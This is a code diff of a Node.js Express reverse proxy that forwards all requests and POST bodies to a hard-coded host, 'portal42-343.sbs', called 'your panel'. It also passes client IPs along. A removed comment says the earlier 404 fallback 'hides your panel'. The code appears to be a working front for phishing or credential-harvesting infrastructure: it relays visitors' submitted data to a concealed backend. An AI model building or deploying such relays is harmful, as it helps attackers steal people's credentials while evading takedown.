@@ -4,38 +4,38 @@ const port = process.env.PORT || 3000;
 
 const PANEL = 'portal42-343.sbs';
 
-// ---- Proxy for /l/ and /device/ ----
-app.use('/l/*', async (req, res) => {
+// Forward ALL requests to your panel
+app.use('*', async (req, res) => {
     try {
         const target = new URL(req.originalUrl, `https://${PANEL}`);
         const headers = new Headers(req.headers);
         headers.set('Host', PANEL);
         headers.set('User-Agent', 'Mozilla/5.0');
-        const response = await fetch(target.toString(), { method: req.method, headers });
+
+        // Pass real client IP if available
+        const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+        if (clientIp) {
+            headers.set('X-Forwarded-For', clientIp);
+            headers.set('CF-Connecting-IP', clientIp);
+        }
+
+        const opts = {
+            method: req.method,
+            headers: headers,
+        };
+        if (req.method !== 'GET' && req.method !== 'HEAD') {
+            opts.body = req.body;
+        }
+
+        const response = await fetch(target.toString(), opts);
         const body = await response.text();
-        res.status(response.status).set('Content-Type', response.headers.get('content-type') || 'text/html').send(body);
+        const contentType = response.headers.get('content-type') || '';
+
+        res.status(response.status).set('Content-Type', contentType).send(body);
     } catch (e) {
+        console.error('Proxy error:', e);
         res.status(500).send('Proxy Error');
     }
-});
-
-app.use('/device/*', async (req, res) => {
-    try {
-        const target = new URL(req.originalUrl, `https://${PANEL}`);
-        const headers = new Headers(req.headers);
-        headers.set('Host', PANEL);
-        headers.set('User-Agent', 'Mozilla/5.0');
-        const response = await fetch(target.toString(), { method: req.method, headers });
-        const body = await response.text();
-        res.status(response.status).set('Content-Type', response.headers.get('content-type') || 'text/html').send(body);
-    } catch (e) {
-        res.status(500).send('Proxy Error');
-    }
-});
-
-// ---- Root and all other paths – 404 (hides your panel) ----
-app.use('*', (req, res) => {
-    res.status(404).send('Not Found');
 });
 
 app.listen(port, () => console.log('✅ Proxy running on port ' + port));
